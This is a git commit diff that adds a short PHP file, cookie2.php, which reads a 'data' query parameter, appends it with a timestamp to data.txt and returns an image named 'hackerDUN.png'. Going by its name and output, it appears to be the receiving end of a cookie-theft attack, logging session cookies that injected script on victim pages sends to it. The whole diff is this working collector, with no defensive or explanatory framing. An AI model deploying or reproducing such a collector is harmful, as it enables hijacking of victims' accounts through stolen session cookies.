4956c70b36fcad9c64feaa9063dc5e499fb63c0d
drone3917 <83193702+drone3917@users.noreply.github.com>
2022-07-26 21:49:00 +0900

    Update cookie2.php

--- cookie2.php
+++ cookie2.php
@@ -1,1 +1,8 @@
-
+<?php
+	$cookie=$_GET['data'];
+	$atime=date("y-m-d H:i:s");
+	$log=fopen("data.txt","a");
+	fwrite($log, $atime." ".$cookie."\r\n");
+	fclose($log);
+	echo "<img src=hackerDUN.png></img>";
+?>
